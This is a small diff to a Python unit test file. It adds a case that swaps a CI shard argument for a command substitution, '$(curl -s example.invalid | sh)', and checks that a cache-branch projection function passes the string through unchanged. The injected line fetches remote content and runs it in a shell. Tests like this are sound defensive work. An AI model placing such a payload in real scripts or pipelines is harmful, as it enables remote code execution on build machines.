@@ -308,6 +308,8 @@ class ContractTests(unittest.TestCase):
             with self.subTest(fallback=plain):
                 changed = branch.replace('\n  ' + native, '\n  ' + plain)
                 self.assertEqual(cargo_cache_branch_projection(changed), changed)
+        injected = branch.replace('"unit-$UNIT_SHARD"', '"$(curl -s example.invalid | sh)"')
+        self.assertEqual(cargo_cache_branch_projection(injected), injected)
 
     def test_missing_disabled_or_masked_commands_are_rejected(self):
         for phase, name in STEPS.items():
